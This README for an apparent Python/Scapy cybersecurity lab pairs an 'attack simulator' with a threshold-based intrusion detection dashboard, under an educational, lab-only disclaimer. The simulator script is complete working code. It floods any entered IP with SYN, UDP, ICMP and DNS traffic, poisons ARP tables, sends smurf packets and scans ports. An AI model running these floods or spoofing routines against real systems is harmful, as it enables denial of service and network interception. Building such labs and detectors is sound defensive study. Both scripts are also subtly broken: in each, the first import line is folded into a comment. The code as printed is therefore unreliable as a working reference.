🛡️ Nexus Defender — Security Analyzer
Nexus Defender is a Python-based cybersecurity lab framework that integrates attack simulation and a real-time intrusion detection system (IDS) for analyzing network behavior in a controlled environment.

It demonstrates how malicious network traffic patterns can be generated and detected using behavioral anomaly detection techniques.

🔥 Key Features
🟥 Attack Simulator (Nexus Striker)
A multi-threaded traffic generator capable of simulating various network-layer assaults:

Volumetric Attacks: SYN Flood, UDP Torrent, ICMP Flood.

Reconnaissance: Sequential Port Scanning and Sensitive Port Probing (SSH/FTP/SMB).

Layer 2 Attacks: ARP Poisoning/Spoofing.

Amplification: DNS Flood and Smurf attacks.

🟦 Security Analyzer (IDS Engine)
A stateful monitoring dashboard that provides:

Real-time Sniffing: Powered by Scapy for deep packet inspection.

Behavioral Detection: PPS (Packets-Per-Second) analysis for DoS mitigation.

Heuristic Tracking: Per-IP unique port tracking to identify scanners.

Severity Tiering: Automatic classification of traffic into Critical, Warning, and Normal states.

🧠 Detection Logic
The system utilizes a sliding time-window approach. By leveraging Python's collections.deque, the IDS maintains a rolling history of packet timestamps per IP address.

DoS Threshold: Triggers at >50 PPS.

Port Scan Threshold: Triggers when >15 unique ports are hit by a single source.

Sensitive Monitoring: Flags any interaction with ports 21 (FTP), 22 (SSH), 23 (Telnet), and 445 (SMB).

⚙️ Tech Stack
Language: Python 3.x

Packet Manipulation: Scapy

GUI Framework: Tkinter

Concurrency: Threading (for simultaneous sniffing and UI responsiveness)

🚀 Installation & Usage
1. Prerequisites
Ensure you have Python installed and administrative/root privileges (required for raw socket access).

2. Install Dependencies
Bash
pip install scapy
3. Running the Framework
The project consists of two primary components:

A. The Attack Simulator
Launch this to generate malicious traffic for testing.

Python
# Save as simulator.py
# import tkinter as tk
from tkinter import ttk, messagebox
from scapy.all import *
import threading, random, time, ctypes, logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

DARK_BG, CARD_BG, ACCENT = "#0d0d0f", "#16161e", "#ff0055"

class AttackSimulator:
    def __init__(self, root):
        self.root = root
        self.root.title("NEXUS STRIKER | SIMULATOR")
        self.root.geometry("1000x850")
        self.root.configure(bg=DARK_BG)

        self.target_ip = tk.StringVar(value="127.0.0.1")
        self.stop_flag = False
        self.packet_count = 0
        self.target_mac = None
        
        # Auto-detecting the interface Scapy is currently using
        self.active_iface = conf.iface 

        self.setup_ui()

    def setup_ui(self):
        hdr = tk.Frame(self.root, bg=DARK_BG, pady=20); hdr.pack(fill=tk.X, padx=20)
        tk.Label(hdr, text="TARGET IP:", bg=DARK_BG, fg=ACCENT, font=('Consolas', 10, 'bold')).grid(row=0, column=0)
        tk.Entry(hdr, textvariable=self.target_ip, bg="#000", fg="#fff", width=20).grid(row=0, column=1, padx=5)
        
        iface_name = getattr(self.active_iface, 'description', str(self.active_iface))
        tk.Label(hdr, text=f"SENSOR: {iface_name[:30]}...", bg="#1a1a1a", fg="#00ffcc", font=('Consolas', 9)).grid(row=0, column=2, padx=20)

        stats_frame = tk.Frame(self.root, bg=CARD_BG, highlightbackground=ACCENT, highlightthickness=1)
        stats_frame.pack(fill=tk.X, padx=20, pady=5)
        self.count_label = tk.Label(stats_frame, text="0", bg=CARD_BG, fg=ACCENT, font=('Consolas', 40, 'bold'))
        self.count_label.pack()

        grid = tk.Frame(self.root, bg=DARK_BG)
        grid.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

        attacks = [
            ("PORT SCAN", self.port_scan), ("ICMP FLOOD", self.icmp_flood),
            ("SENSITIVE PROBE", self.sensitive_access), ("RANDOM NOISE", self.random_traffic),
            ("SYN FLOOD", self.syn_flood), ("UDP TORRENT", self.udp_flood),
            ("ARP POISON", self.arp_spoof), ("SMURF ATTACK", self.smurf_attack),
            ("DNS FLOOD", self.dns_flood), ("MIXED ASSAULT", self.mixed_attack)
        ]

        for i, (name, func) in enumerate(attacks):
            btn = tk.Button(grid, text=name, command=lambda f=func: self.launch_attack(f),
                           bg="#1a1a1a", fg=ACCENT, font=('Segoe UI', 9, 'bold'), width=22, pady=10)
            btn.grid(row=i//2, column=i%2, padx=5, pady=5, sticky="nsew")
        
        for i in range(2): grid.grid_columnconfigure(i, weight=1)

        tk.Button(self.root, text="⏹ TERMINATE ALL VECTORS", command=self.stop_all, 
                  bg=ACCENT, fg="white", font=('Segoe UI', 12, 'bold')).pack(fill=tk.X, padx=20, pady=10)

        self.console = tk.Text(self.root, height=10, bg="black", fg=ACCENT, font=('Consolas', 9))
        self.console.pack(fill=tk.X, padx=20, pady=10)

    def log(self, msg):
        self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n"); self.console.see(tk.END)

    def lock_target(self):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=self.target_ip.get()), timeout=1, iface=self.active_iface, verbose=0)
            for _, rcv in ans:
                self.target_mac = rcv.hwsrc
                return
        except: pass
        self.target_mac = "ff:ff:ff:ff:ff:ff"

    def send_pkt(self, pkt):
        if self.stop_flag: return
        try:
            sendp(Ether(dst=self.target_mac)/pkt, iface=self.active_iface, verbose=0)
            self.packet_count += 1
            self.root.after(0, lambda: self.count_label.config(text=str(self.packet_count)))
        except: pass

    def launch_attack(self, func):
        self.lock_target()
        self.stop_flag = False
        self.log(f"DEPLOYING: {func.__name__.upper()}...")
        threading.Thread(target=func, daemon=True).start()

    def stop_all(self):
        self.stop_flag = True
        self.packet_count = 0
        self.log("STOPPED.")

    def port_scan(self):
        for port in range(20, 150):
            if self.stop_flag: break
            self.send_pkt(IP(dst=self.target_ip.get())/TCP(dport=port, flags="S"))
            time.sleep(0.05)
    def icmp_flood(self):
        while not self.stop_flag: self.send_pkt(IP(dst=self.target_ip.get())/ICMP()); time.sleep(0.01)
    def sensitive_access(self):
        for p in [21, 22, 23, 445]:
            if self.stop_flag: break
            self.send_pkt(IP(dst=self.target_ip.get())/TCP(dport=p, flags="S")); time.sleep(0.3)
    def random_traffic(self):
        while not self.stop_flag: self.send_pkt(IP(dst=self.target_ip.get())/TCP(dport=random.randint(1,65535))); time.sleep(0.05)
    def syn_flood(self):
        while not self.stop_flag: self.send_pkt(IP(dst=self.target_ip.get())/TCP(sport=random.randint(1024,65535), dport=80, flags="S"))
    def udp_flood(self):
        while not self.stop_flag: self.send_pkt(IP(dst=self.target_ip.get())/UDP(dport=random.randint(1,65535))/Raw(load="X"*1024))
    def arp_spoof(self):
        while not self.stop_flag: self.send_pkt(ARP(op=2, pdst=self.target_ip.get(), psrc="10.0.0.1", hwdst=self.target_mac)); time.sleep(1)
    def smurf_attack(self):
        while not self.stop_flag: self.send_pkt(IP(src=self.target_ip.get(), dst="255.255.255.255")/ICMP()); time.sleep(0.1)
    def dns_flood(self):
        while not self.stop_flag: self.send_pkt(IP(dst=self.target_ip.get())/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com")))
    def mixed_attack(self):
        threading.Thread(target=self.syn_flood, daemon=True).start()
        threading.Thread(target=self.udp_flood, daemon=True).start()

if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin(): print("RUN AS ADMIN!")
    else: root = tk.Tk(); app = AttackSimulator(root); root.mainloop()
B. The Security Analyzer (IDS)
Launch this to monitor and defend your network.

Python
# Save as ids.py
# import os, time, threading, re, ipaddress, queue
from datetime import datetime
from collections import deque, defaultdict
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from scapy.all import *

# --- STYLING ---
DARK_BG, CARD_BG, ACCENT = "#08090d", "#11141d", "#00d1ff"
CRITICAL_RED = "#ff3e3e"
WARNING_GOLD = "#ffcc00"
NORMAL_GREEN = "#1db954"

shared_queue = queue.Queue()

class DetectionEngine:
    def __init__(self):
        self.traffic = defaultdict(lambda: deque(maxlen=100))
        self.port_hits = defaultdict(set) 

    def analyze(self, pkt, actor):
        alerts, level, now = [], "normal", time.time()
        self.traffic[actor].append(now)
        
        # 1. CRITICAL: DoS Detection (High PPS)
        pps = len([t for t in self.traffic[actor] if now - t < 1.0])
        if pps > 50: 
            alerts.append(f"🚨 DoS ATTACK: {pps} PPS")
            level = "critical"

        # 2. CRITICAL: Port Scan Detection
        if pkt.haslayer(TCP):
            self.port_hits[actor].add(pkt[TCP].dport)
            if len(self.port_hits[actor]) > 15:
                alerts.append(f"🔍 PORT SCAN: {len(self.port_hits[actor])} Ports")
                level = "critical"

        # 3. CRITICAL: ICMP Flood
        if pkt.haslayer(ICMP):
            icmp_count = len([t for t in self.traffic[actor] if now - t < 1.0])
            if icmp_count > 20: 
                alerts.append("🌊 ICMP FLOOD")
                level = "critical"

        # 4. WARNING: Sensitive Access
        if level != "critical":
            if pkt.haslayer(TCP) and pkt[TCP].dport in [21, 22, 23, 445]:
                alerts.append(f"⚠️ SENSITIVE PORT: {pkt[TCP].dport}")
                level = "warning"
            
        return alerts, level

class NexusDefender:
    def __init__(self, root):
        self.root = root
        self.root.title("NEXUS DEFENDER | SECURITY ANALYZER")
        self.root.geometry("1200x800")
        self.root.configure(bg=DARK_BG)
        
        self.running, self.targets, self.count, self.engine = False, set(), 0, DetectionEngine()
        self.captured_packets = []
        
        self.setup_ui()
        self.check_queue()

    def setup_ui(self):
        # --- Top Header (Lock Config Section) ---
        hdr = tk.Frame(self.root, bg=DARK_BG, pady=10); hdr.pack(fill=tk.X, padx=20)
        
        tk.Label(hdr, text="PROTECTED IPs:", bg=DARK_BG, fg=ACCENT, font=('Consolas', 10, 'bold')).grid(row=0, column=0)
        self.entry = tk.Entry(hdr, bg="#000", fg="#fff", width=30, insertbackground="white", font=('Consolas', 11))
        self.entry.grid(row=0, column=1, padx=10); self.entry.insert(0, "127.0.0.1")
        
        tk.Label(hdr, text="BPF FILTER:", bg=DARK_BG, fg="#00ffcc", font=('Consolas', 10, 'bold')).grid(row=0, column=2)
        self.bpf_entry = tk.Entry(hdr, bg="#000", fg="#00ffcc", width=20, insertbackground="white", font=('Consolas', 11))
        self.bpf_entry.grid(row=0, column=3, padx=10); self.bpf_entry.insert(0, "ip")

        # The IP LOCK Button
        tk.Button(hdr, text="🔒 LOCK CONFIG", command=self.lock_alert, bg="#2a314d", fg="white", font=('Segoe UI', 9, 'bold'), padx=10).grid(row=0, column=4)

        # --- Control Bar ---
        btn_f = tk.Frame(self.root, bg=DARK_BG, pady=10); btn_f.pack(fill=tk.X, padx=20)
        
        tk.Button(btn_f, text="▶ START MONITORING", command=self.start, bg=NORMAL_GREEN, fg="white", width=18, font=('Segoe UI', 9, 'bold')).pack(side=tk.LEFT)
        tk.Button(btn_f, text="⏹ STOP", command=self.stop, bg=CRITICAL_RED, fg="white", width=10, font=('Segoe UI', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_f, text="🔄 RESTART", command=self.restart, bg="#5d3fd3", fg="white", font=('Segoe UI', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_f, text="🧹 CLEAR LOGS", command=self.clear_logs, bg="#444", fg="white", font=('Segoe UI', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_f, text="💾 EXPORT PCAP", command=self.export_pcap, bg="#f39c12", fg="white", font=('Segoe UI', 9, 'bold')).pack(side=tk.RIGHT)

        self.status = tk.Label(btn_f, text="● STANDBY", bg=DARK_BG, fg="gray", font=('Consolas', 10, 'bold'))
        self.status.pack(side=tk.RIGHT, padx=20)

        # --- Dashboard Table ---
        self.tree = ttk.Treeview(self.root, columns=("ID", "Time", "Src", "Dst", "Proto", "Security Event"), show="headings")
        for c in self.tree["columns"]: self.tree.heading(c, text=c.upper()); self.tree.column(c, anchor="center", width=90)
        self.tree.column("Security Event", width=450); self.tree.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        # Color Tags
        self.tree.tag_configure("critical", background="#3d0000", foreground=CRITICAL_RED)
        self.tree.tag_configure("warning", background="#332b00", foreground=WARNING_GOLD)
        self.tree.tag_configure("normal", background=CARD_BG, foreground="white")

    def lock_alert(self):
        """Extracts IPs and fires a confirmation alert."""
        ips = re.findall(r'[0-9]+(?:\.[0-9]+){3}', self.entry.get())
        if not ips:
            messagebox.showwarning("Configuration Error", "No valid IPv4 addresses detected in input.")
            return
        
        self.targets = {str(ipaddress.ip_address(i)) for i in ips}
        bpf = self.bpf_entry.get()
        
        # Confirmation Alert
        alert_msg = f"NEXUS KERNEL UPDATED\n\nTargeting: {list(self.targets)}\nActive Filter: {bpf}\n\nSystem ready for ingestion."
        messagebox.showinfo("IP LOCK SECURED", alert_msg)

    def start(self):
        if not self.targets: 
            return messagebox.showerror("System Error", "You must LOCK CONFIG before starting sensors.")
        
        if self.running: return
        
        self.running = True
        self.status.config(text="● ACTIVE", fg=NORMAL_GREEN)
        # Dashboard starts reading now
        threading.Thread(target=self.sniffer, daemon=True).start()

    def stop(self): 
        self.running = False
        self.status.config(text="● STANDBY", fg="gray")

    def restart(self): 
        self.stop()
        time.sleep(0.5)
        self.start()

    def clear_logs(self):
        for item in self.tree.get_children(): self.tree.delete(item)
        self.count = 0
        self.captured_packets = []

    def export_pcap(self):
        if not self.captured_packets: return messagebox.showwarning("!", "Buffer empty. No data to export.")
        path = filedialog.asksaveasfilename(defaultextension=".pcap")
        if path: 
            wrpcap(path, self.captured_packets)
            messagebox.showinfo("Export Successful", f"Session saved to: {path}")

    def sniffer(self):
        # The sniffer will only process if self.running is True
        sniff(filter=self.bpf_entry.get(), prn=self.handler, stop_filter=lambda x: not self.running, store=False)

    def handler(self, pkt):
        if not self.running: return
        if not pkt.haslayer(IP): return
        
        self.captured_packets.append(pkt)
        s, d = pkt[IP].src, pkt[IP].dst
        
        if s in self.targets or d in self.targets:
            actor = s if s not in self.targets else d
            alerts, level = self.engine.analyze(pkt, actor)
            
            # Put into queue for the UI thread to pick up
            shared_queue.put({
                "src": s, "dst": d, 
                "proto": pkt.sprintf("%IP.proto%"), 
                "alerts": alerts,
                "level": level
            })

    def check_queue(self):
        """Continuously checks the queue, but only updates UI if running."""
        while not shared_queue.empty():
            if self.running:
                item = shared_queue.get()
                self.count += 1
                row = self.tree.insert("", 0, values=(
                    self.count, 
                    datetime.now().strftime("%H:%M:%S"), 
                    item['src'], item['dst'], 
                    item['proto'].upper(), 
                    " | ".join(item['alerts']) if item['alerts'] else "✔ OK"
                ), tags=(item['level'],))
            else:
                # Flush queue if stopped to prevent backlog on restart
                shared_queue.get()
                
        self.root.after(100, self.check_queue)

if __name__ == "__main__":
    root = tk.Tk(); app = NexusDefender(root); root.mainloop()
📊 Operational Overview
Run as Administrator: Both scripts require elevated privileges to interact with the Network Interface Card (NIC).

Lock Configuration: In the IDS, enter your target IP (e.g., 127.0.0.1) and click Lock Config.

Deploy Vectors: Use the Simulator to launch a "SYN Flood" or "Port Scan."

Analyze: Watch the IDS dashboard categorize the traffic and export the session as a .pcap file for further analysis in Wireshark.

⚠️ Disclaimer
This project is strictly for educational and cybersecurity research purposes only. Unauthorized testing against systems you do not own is illegal. Use only in controlled, isolated lab environments.
